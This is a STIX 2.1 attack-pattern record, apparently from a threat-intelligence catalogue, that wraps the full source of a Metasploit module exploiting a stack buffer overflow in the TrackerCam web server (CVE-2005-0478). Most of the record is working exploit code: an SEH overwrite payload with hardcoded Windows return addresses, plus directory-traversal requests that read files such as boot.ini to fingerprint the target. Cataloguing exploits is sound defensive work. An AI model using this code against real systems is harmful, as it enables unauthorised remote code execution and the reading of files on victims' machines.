{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--12a6a1f2-ae3f-4296-8df0-7bbeaa28fb47",
    "created": "2024-08-14T16:53:39.978368Z",
    "modified": "2024-08-14T16:53:39.978373Z",
    "name": "TrackerCam PHP Argument Buffer Overflow",
    "description": " This module exploits a simple stack buffer overflow in the TrackerCam web server. All current versions of this software are vulnerable to a large number of security issues. This module abuses the directory traversal flaw to gain information about the system and then uses the PHP overflow to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/trackercam_phparg_overflow.rb",
            "external_id": "trackercam_phparg_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0478"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/tcambof-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TrackerCam PHP Argument Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a simple stack buffer overflow in the\n        TrackerCam web server. All current versions of this software\n        are vulnerable to a large number of security issues. This\n        module abuses the directory traversal flaw to gain\n        information about the system and then uses the PHP overflow\n        to execute arbitrary code.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0478'],\n          [ 'OSVDB', '13953'],\n          [ 'OSVDB', '13955'],\n          [ 'BID', '12592'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/tcambof-adv.txt'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # EyeWD.exe has a null and we can not use a partial overwrite.\n          # All of the loaded application DLLs have a null in the address,\n          # except CPS.dll, which moves around between instances :-(\n\n          ['Windows 2000 English',\t\t{ 'Ret' => 0x75022ac4 }], # ws2help.dll\n          ['Windows XP English SP0/SP1',\t{ 'Ret' => 0x71aa32ad }], # ws2help.dll\n          ['Windows NT 4.0 SP4/SP5/SP6',\t{ 'Ret' => 0x77681799 }], # ws2help.dll\n\n          # Windows XP SP2 and Windows 2003 are not supported yet :-/\n        ],\n      'DisclosureDate' => '2005-02-18',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8090)\n      ])\n  end\n\n  def check\n    res = send_request_raw({\n      'uri'   => '/tuner/ComGetLogFile.php3',\n      'query' => 'fn=../HTTPRoot/socket.php3'\n    }, 5)\n\n    if (res and res.body =~ /fsockopen/)\n      fp = fingerprint()\n      vprint_status(\"Detected a vulnerable TrackerCam installation on #{fp}\")\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    c = connect\n\n    buf = rand_text_english(8192)\n    seh = generate_seh_payload(target.ret)\n    buf[257, seh.length] = seh\n\n    print_status(\"Sending request...\")\n    res = send_request_raw({\n      'uri'   => '/tuner/TunerGuide.php3',\n      'query' => 'userID=' + buf\n    }, 5)\n\n    handler\n  end\n\n  def download_log(path)\n\n    res = send_request_raw({\n      'uri'   => '/tuner/ComGetLogFile.php3',\n      'query' => 'fn=' + (\"../\" * 10) + path\n    }, 5)\n\n    return if !(res and res.body and res.body =~ /tuner\\.css/ and res.body =~ /<pre>/)\n\n    m = res.match(/<pre>(.*)<\\/pre><\\/body>/smi)\n    return if not m\n    return m[1]\n  end\n\n  def fingerprint\n\n    res = download_log(rand_text_alphanumeric(12) + '.txt')\n    return if not res\n\n    m = res.match(/in <b>(.*)<\\/b> on line/smi)\n    return if not m\n\n    path = m[1]\n\n    print_status(\"TrackerCam installation path is #{path}\")\n\n    if (path !~ /^C/i)\n      print_status(\"TrackerCam is not installed on the system drive, we can't fingerprint it\")\n      return\n    end\n\n    if (path !~ /Program Files/i)\n      print_status(\"TrackerCam is installed in a non-standard location\")\n    end\n\n    boot = download_log('boot.ini')\n    return if not boot\n\n    case boot\n      when /Windows XP.*NoExecute/i\n        return \"Windows XP SP2+\"\n      when /Windows XP/\n        return \"Windows XP SP0-SP1\"\n      when /Windows.*2003/\n        return \"Windows 2003\"\n      when /Windows.*2000/\n        return \"Windows 2000\"\n      else\n        return \"Unknown OS/SP\"\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-02-18",
    "x_mitre_platforms": [
        "win'"
    ]
}